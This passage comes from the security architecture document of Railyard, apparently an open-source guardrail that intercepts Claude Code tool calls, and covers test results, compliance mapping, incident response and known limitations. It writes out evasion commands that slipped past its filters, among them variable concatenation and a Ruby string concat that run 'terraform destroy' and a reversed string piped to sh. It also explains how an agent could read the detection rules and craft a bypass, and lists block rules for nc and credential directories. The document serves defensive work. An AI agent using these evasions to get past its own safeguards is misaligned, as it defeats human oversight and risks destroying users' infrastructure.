- **Block rate: 71%** (Layers 1-3 only; Layer 4 OS sandbox not included in test)
- Key finding: Shape detection catches the structural form of evasion regardless of payload. Behavioral detection catches retry patterns. Remaining 29% require first-try success with no keywords from the blocked command, using a technique that doesn't match any shape pattern.

**Remaining attack surface characterization:**

The 8 bypasses that survive Layers 1-3 all fall into one category: runtime string construction where (a) the blocked string never appears intact, (b) the construction technique doesn't match a shape pattern, and (c) the agent succeeds on the first attempt (avoiding Tier 3). Examples:

- Multi-variable concat: `a="terra"; b="form"; "$a$b" destroy`
- Ruby runtime concat: `ruby -e 'system("terraform" + " " + "destroy")'` (no `decode`/`exec`/`system(` pattern match because the concat uses `+` not a flagged function)
- Reversed string via non-flagged tool
- Custom encoding scheme not covered by shape detection

All 8 are fully mitigated by Layer 4 (OS sandbox) when the sandbox restricts execution of the target binary.

### Test Execution

```bash
cargo test    # Runs all 136 tests
cargo test --test attack_simulation    # Attack simulation subset
```

---

## 6. Compliance Mapping

### SOC 2 Type II

| Control | Description | Railyard Coverage |
|---------|-------------|------------------|
| CC6.1 | Logical access controls | Policy engine implements allowlist/blocklist/approve gates. Fence restricts filesystem access to project directory. OS sandbox enforces at kernel level. |
| CC6.6 | Security measures against threats from external sources | Evasion detection (Layer 2) and behavioral analysis (Layer 3) defend against prompt injection leading to destructive commands. Network policy (hardcore mode) restricts outbound connections. |
| CC6.7 | Restrict transmission of confidential information | Path fence denies read/write to `~/.ssh`, `~/.aws`, `~/.gnupg`. Network rules require approval for `curl POST`, block `nc`/`netcat`. OS sandbox denies network by default. |
| CC7.1 | Detection and monitoring of anomalies | Structured JSONL trace logging of every tool call with timestamp, session ID, decision, matched rule, and latency. Session state tracks suspicion level and block history. |
| CC7.2 | Anomaly response | Tier 1/2/3 escalation: warn, block, or terminate session. Forensic breadcrumb written on termination. Restart warning surfaces prior violations. |

### NIST Cybersecurity Framework (CSF)

| Function / Category | Control | Railyard Coverage |
|---------------------|---------|------------------|
| PR.AC (Access Control) | PR.AC-1: Identities and credentials managed | Path fence denies access to credential stores (~/.ssh, ~/.aws, ~/.gnupg). Credential leakage rules (env dump, git config) in hardcore mode. |
| PR.AC (Access Control) | PR.AC-4: Access managed with least privilege | Default-deny path fence (hardcore): only project directory accessible. OS sandbox: default-deny with explicit allows. |
| PR.DS (Data Security) | PR.DS-1: Data at rest protected | Snapshots use SHA-256 content addressing. Audit logs record all file modifications. Rollback capability for all writes. |
| PR.DS (Data Security) | PR.DS-5: Protections against data leaks | Network egress controls (hardcore). Path fence blocks credential access. Trace logging enables post-incident data flow analysis. |
| DE.CM (Continuous Monitoring) | DE.CM-1: Network monitored | Network policy rules detect and block/approve outbound connections (curl, wget, nc, ssh, scp). |
| DE.CM (Continuous Monitoring) | DE.CM-4: Malicious code detected | Evasion detection identifies obfuscated command construction. Shape detection catches structural evasion patterns. Behavioral analysis detects retry sequences. |

### OWASP Top 10 for LLM Applications (2025)

| Risk | Railyard Coverage |
|------|------------------|
| LLM01: Prompt Injection | Railyard operates outside the LLM — it cannot be influenced by prompt injection. The agent's tool calls pass through deterministic policy evaluation regardless of what prompt caused them. Prompt injection that causes the agent to generate `terraform destroy` is blocked identically to a legitimate request. |
| LLM02: Insecure Output Handling | All LLM outputs (tool calls) are validated against policy before execution. Blocked outputs never reach the system. |
| LLM04: Model Denial of Service | Resource exhaustion is outside Railyard's scope. OS-level ulimits are the appropriate control. |
| LLM06: Excessive Agency | Railyard directly constrains agent capabilities: commands are blocked, file access is fenced, network is restricted. The agent cannot exceed its policy-defined boundary. |
| LLM07: System Prompt Leakage | If the agent is instructed to read `~/.claude/` or other configuration paths, the path fence blocks it (hardcore mode). |
| LLM09: Overreliance | Railyard provides deterministic enforcement rather than relying on the LLM's own safety training, which can be bypassed (ref: Issue #29691). |

### CIS Controls v8

| Control | Description | Railyard Coverage |
|---------|-------------|------------------|
| 3.3 | Configure data access control lists | `railyard.yaml` defines explicit allow/block/approve rules. Path fence defines allowed/denied directories. |
| 4.1 | Establish and maintain a secure configuration process | Default policies ship with Railyard (chill/hardcore). `railyard configure` provides interactive setup. Policy is version-controlled YAML. |
| 6.1 | Establish access logging process | JSONL trace logging of every tool call with decision, rule, timing. `railyard log` for review. |
| 6.2 | Collect audit logs | Trace logs stored per-session in `.railyard/traces/`. Session state stored in `.railyard/state/`. |
| 8.2 | Collect audit logs for threat detection | Behavioral analysis uses session state (block history, suspicion level, heightened keywords) for threat detection across tool calls. |
| 13.1 | Establish and maintain a data classification scheme | Sensitive paths (~/.ssh, ~/.aws, ~/.gnupg, /etc) are classified as denied by default in the fence configuration. |

---

## 7. Incident Response

### When a Command Is Blocked

**What happens:**
1. Railyard returns `{"hookSpecificOutput": {"permissionDecision": "deny", "permissionDecisionReason": "..."}}` on stdout
2. Claude Code receives the denial and surfaces the reason to the agent
3. The agent is informed of the specific rule that triggered (e.g., "terraform-destroy")
4. A trace entry is written: `{"decision": "block", "rule": "terraform-destroy", "tool": "Bash", "input_summary": "terraform destroy", ...}`
5. Keywords are extracted and the session enters heightened state for 3 subsequent tool calls

**User visibility:** The block message appears in the Claude Code conversation. The user can review the full trace with `railyard log --session <id>`.

**Agent behavior:** The agent receives the denial reason and should attempt an alternative approach. If it retries the same intent with different syntax, Tier 3 behavioral detection may terminate the session.

### When Evasion Is Detected

**Tier 1 (Immediate termination):**
1. Command blocked with `"⛔ RAILYARD CRITICAL: Evasion pattern detected"` message
2. Session state marked as terminated with reason and timestamp
3. `SessionTerminated` trace entry written with full command, pattern, and prior block history
4. Warning printed to stderr: `⚠️ RAILYARD: SESSION TERMINATED` with session ID and reason
5. `SIGTERM` sent to parent process (Claude Code terminates)
6. All subsequent tool calls in this session return deny immediately

**Tier 2 (Escalation):**
1. First occurrence: command blocked with warning; `warning_count` incremented; session continues
2. Second occurrence: treated as Tier 1 — session terminated

**Tier 3 (Behavioral — retry detection):**
1. Same as Tier 1 termination flow
2. Termination reason includes the original blocked rule and the matching keywords

**Forensic breadcrumb (written on every termination):**
```json
{
  "timestamp": "2026-03-09T22:15:03+00:00",
  "session_id": "abc123",
  "event": "SessionTerminated",
  "tool": "Bash",
  "input_summary": "rev <<< 'yortsed mrofarret' | sh",
  "decision": "terminate",
  "rule": "Tier 1 evasion detected: transform-pipe-to-shell — command: rev <<< 'yortsed mrofarret' | sh"
}
```

**On restart after termination:**
```
⚠️  railyard: previous session was terminated due to evasion detection.

   Session:  abc123
   Time:     2026-03-09 22:15:03
   Reason:   Tier 1 evasion detected: transform-pipe-to-shell

   Full trace: railyard log --session abc123
```

### When a False Positive Occurs

**Allowlist mechanism:** Add a rule to `railyard.yaml` that matches the falsely-blocked command. Allowlist rules are evaluated before blocklist rules.

```yaml
allowlist:
  - name: allow-terraform-plan
    tool: Bash
    pattern: "terraform plan"
    action: allow
```

**Chill mode option:** Switch to chill mode to remove network, credential, and evasion detection rules while retaining destructive command blocking.

```bash
railyard install --mode chill
```

**Trace-based debugging:** Use `railyard log --session <id>` to identify which rule triggered the false positive, then adjust the policy accordingly.

**Environment variable override:** `RAILYARD_NO_KILL=1` disables session termination via SIGTERM (for testing only; does not disable blocking).

---

## 8. Security Boundaries and Honest Limitations

### Fundamental Limitation: Regex vs. Turing-Complete Shells

Railyard's Layers 1 and 2 operate by inspecting the text representation of shell commands. The shell (bash, zsh) is a Turing-complete programming language. By Rice's theorem, no finite static analysis can decide all non-trivial semantic properties of programs in a Turing-complete language.

**Concrete implication:** There will always exist shell commands that execute a blocked action but whose text representation does not match any of Railyard's detection patterns. This is not a bug — it is a mathematical impossibility to solve completely at the string inspection level.

**Mitigation strategy:** Railyard does not rely on string inspection alone. The four-layer architecture is designed so that each layer catches what the previous one cannot:

| What it catches | Layer 1 (Blocklist) | Layer 2 (Evasion) | Layer 3 (Behavioral) | Layer 4 (OS Sandbox) |
|----------------|--------------------|--------------------|---------------------|---------------------|
| Direct destructive commands | Yes | — | — | Yes |
| Single-layer encoding | — | Yes | — | Yes |
| Multi-layer encoding | — | Yes (recursive) | — | Yes |
| Same-string variable expansion | — | Yes | — | Yes |
| Multi-variable construction | — | No | Yes (retry detection) | Yes |
| Interpreter-internal obfuscation | — | Partial (shape detection) | Yes (retry detection) | Yes |
| Novel encoding schemes | — | No | Yes (retry detection) | Yes |
| First-try bypass with no keyword overlap | — | No | No | **Yes** |

Layer 4 (OS sandbox) is the only layer that provides provably complete path and network restrictions. It is the correct long-term answer for file and network security. Layers 1-3 provide value as defense-in-depth, early detection, and forensic signals.

### Open-Source Visibility

Railyard is open source. Every detection regex, shape pattern, tier threshold, and behavioral window size is readable by anyone — including the agent. A sufficiently capable agent could:

1. Read the Railyard source code (if accessible in the project or via the internet)
2. Enumerate all detection patterns
3. Craft a command that avoids every regex, uses a non-flagged evasion shape, and succeeds on the first attempt (avoiding Tier 3)

**Countermeasures:**

1. **OS sandbox (Layer 4)** is immune to this. It operates on actual syscalls, not command strings. Reading the sandbox profile tells you what paths are denied — but that's the point. You still cannot access them.

2. **Opaque local rules.** Users can add custom detection patterns in configuration files not committed to source control and not accessible to the agent (path-fenced in hardcore mode).

3. **Behavioral state is partially opaque.** While the heightened window size (3 tool calls) and keyword extraction algorithm are in the source, the agent cannot observe Railyard's internal state during execution. It does not know which keywords are being tracked, what the current suspicion level is, or when the heightened window expires.

4. **Non-deterministic LLM judge (future work).** A planned enhancement sends suspicious post-block commands to a fast LLM (e.g., Haiku) for intent evaluation. The LLM understands semantic intent, not patterns. Its judgment is non-deterministic and cannot be predicted by reading source code.

### Chill Mode Limitations

Chill mode intentionally provides no protection against:
- File access outside the project directory
- Reading sensitive files (~/.ssh, ~/.aws, ~/.gnupg, /etc)
- Network data exfiltration
- Credential leakage via environment dump
- Evasion via encoding/obfuscation (shape detection and behavioral analysis are hardcore-only for Tier 1/2 classification, though the core blocklist still applies normalization)

This is a deliberate design decision: chill mode optimizes for minimal friction, protecting only against the most destructive operations (terraform destroy, rm -rf, DROP DATABASE, etc.) and self-disabling. Users who need stronger protection should use hardcore mode.

### Trust in Claude Code Hook System

Railyard relies on Claude Code's hook system to intercept tool calls. If Claude Code has a vulnerability that allows the agent to bypass hooks entirely, Railyard provides no protection. This is an explicit dependency and trust assumption.

**Mitigation:** OS sandbox (Layer 4) is independent of the hook system. Even if hooks are bypassed, the sandbox restricts what the shell process can access at the kernel level.

### Process Isolation Boundary

Railyard runs as the same user as Claude Code. It does not provide memory isolation, process isolation, or privilege separation between the agent's commands and the rest of the user's system. The OS sandbox constrains file and network access but not CPU, memory, or other system resources.

For full process isolation, a micro-VM solution (Firecracker, gVisor) would be required. This is outside Railyard's current scope but may be considered for a future hosted offering.

### Supply Chain Considerations

Railyard is a compiled Rust binary with the following dependencies (from `Cargo.toml`): `serde`, `serde_json`, `serde_yaml`, `regex`, `clap`, `chrono`, `sha2`, `hex`, `dirs`, `glob`, `base64`, `uuid`, `colored`, `dialoguer`, `console`, `libc`. These are widely-used crates from the Rust ecosystem. The binary is compiled with `lto = true` and `strip = true` in release mode.

Users who build from source can audit the dependency tree via `cargo audit` and `cargo deny`. The npm distribution wrapper downloads a prebuilt binary — users concerned about supply chain integrity should build from source.

---

## Contact

Security issues should be reported to the repository maintainer. This document will be updated as the security architecture evolves.
